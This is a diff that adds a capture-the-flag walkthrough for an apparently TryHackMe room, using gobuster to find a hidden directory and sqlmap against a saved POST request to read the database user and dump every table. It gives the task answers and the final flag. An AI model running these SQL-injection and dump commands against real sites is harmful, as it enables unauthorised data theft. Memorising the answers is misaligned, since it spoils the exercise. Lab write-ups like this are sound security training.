@@ -544,13 +544,72 @@ Or we can simply dump all the available databases and tables using the following
 
 ## Room THM
 
+### Task 1 - What is the name of the interesting directory ?
 
+```bash
+gobuster dir -u 10.10.162.67 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+```
 
+```bash
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.162.67
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/07/08 18:44:56 Starting gobuster in directory enumeration mode
+===============================================================
+/blood                (Status: 301) [Size: 194] [--> http://10.10.162.67/blood/]
+```
 
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-09 00-47-41.png" alt=""><figcaption><p><a href="http://10.10.162.67/blood/">http://10.10.162.67/blood/</a></p></figcaption></figure>
 
+{% hint style="info" %}
+blood
+{% endhint %}
 
+### Task 2 - Who is the current db user?&#x20;
 
+First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory into blood.txt:
 
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-09 00-50-41.png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-09 00-51-50.png" alt=""><figcaption></figcaption></figure>
 
+We have a POST parameter 'blood\_group' which could a vulnerable parameter.
 
+Then, we can launch sqlmap in reading mode and searching current user:
+
+```bash
+sqlmap -r blood.txt --current-user
+```
+
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-09 01-01-18.png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+root
+{% endhint %}
+
+### Task 3 - What is the final flag?
+
+We can use flag --dump to watch all db:
+
+```bash
+sqlmap -r blood.txt -p blood_group --dump
+```
+
+<figure><img src="../.gitbook/assets/Schermata del 2023-07-09 01-17-19.png" alt=""><figcaption></figcaption></figure>
+
+<details>
+
+<summary>🚩 Final Flag</summary>
+
+thm{sqlm@p\_is\_L0ve}
+
+</details>
